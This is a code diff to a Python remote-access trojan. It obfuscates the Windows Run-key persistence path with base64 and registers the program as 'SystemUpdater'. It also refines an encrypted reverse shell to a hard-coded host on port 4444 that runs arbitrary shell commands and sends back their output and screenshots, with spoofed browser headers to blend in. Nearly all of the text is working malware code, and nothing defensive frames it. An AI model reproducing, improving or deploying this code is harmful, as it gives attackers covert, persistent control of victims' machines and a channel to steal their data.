@@ -14,7 +14,7 @@ import winreg
 
 def add_persistence():
     if platform.system() == "Windows":
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        key_path = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
         try:
             reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(reg_key, "SystemUpdater", 0, winreg.REG_SZ, f'"{os.path.abspath(__file__)}.exe"')
@@ -39,8 +39,12 @@ def handle_command(cmd, s, fernet):
     elif cmd == "screenshot":
         s.send(fernet.encrypt(capture_screenshot()))
     else:
-        output = subprocess.getoutput(cmd)
-        s.send(fernet.encrypt(output.encode()))
+        try:
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            output = result.stdout + result.stderr
+            s.send(fernet.encrypt(output.encode()))
+        except Exception as e:
+            s.send(fernet.encrypt(str(e).encode()))
 
 def blend_traffic():
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
@@ -64,15 +68,22 @@ def reverse_shell(host="192.168.100.9", port=4444, key=key):
         try:
             blend_traffic()
             time.sleep(random.randint(1, 10))
+            print(f"Attempting to connect to {host}:{port}")
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, port))
+            print("Connection established.")
 
             while True:
                 cmd = fernet.decrypt(s.recv(4096)).decode()
                 if cmd.lower() == "exit":
                     break
                 handle_command(cmd, s, fernet)
+        except socket.error as e:
+            print(f"Socket error: {e}")
+            time.sleep(5)
+            continue
         except Exception as e:
+            print(f"An unexpected error occurred: {e}")
             time.sleep(5)
             continue
         finally:
